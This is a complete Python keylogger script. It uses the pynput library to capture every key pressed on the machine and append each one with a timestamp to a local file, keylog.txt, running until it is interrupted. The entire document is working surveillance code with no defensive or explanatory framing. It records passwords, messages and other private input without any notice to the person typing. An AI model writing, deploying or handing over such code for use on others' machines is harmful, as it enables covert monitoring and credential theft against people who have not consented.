import logging
from pynput import keyboard
import sys
import signal
import time

# Create a logger
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define a function to handle keyboard events
def on_key_press(key):
    # Get the current timestamp
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    # Write the key press event to the log file
    logging.info(f"{timestamp} - Key pressed: {key}")

# Define a function to handle keyboard interrupts
def signal_handler(sig, frame):
    print("\nLove you 3000, Shady!")
    sys.exit(0)

# Set the keyboard hook
listener = keyboard.Listener(on_press=on_key_press)

# Start the keyboard hook
listener.start()

# Set the signal handler
signal.signal(signal.SIGINT, signal_handler)

# Keep the keyboard hook running indefinitely
while True:
    time.sleep(1)
